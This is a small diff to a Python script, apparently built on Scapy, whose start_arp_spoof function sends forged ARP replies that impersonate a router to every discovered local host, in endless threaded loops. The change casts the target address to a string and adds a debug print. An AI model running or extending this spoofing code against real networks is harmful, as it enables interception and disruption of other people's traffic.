@@ -30,11 +30,12 @@ def start_arp_spoof(router_ip='172.16.119.2'):
 	print("LOCAL IPS")
 	for host in final_results:
 		print("\t- " + str(host))
-		arp = ARP(op=op, psrc=spoof, pdst=host.address, hwdst=host.mac_address)
+		arp = ARP(op=op, psrc=spoof, pdst=str(host.address), hwdst=host.mac_address)
 		threading.Thread(target=do_arp_spoof, args=(arp,)).start()
 
 
 def do_arp_spoof(arp):
+	print("Sending: " + str(arp))
 	while True:
 		try:
 			send(arp)
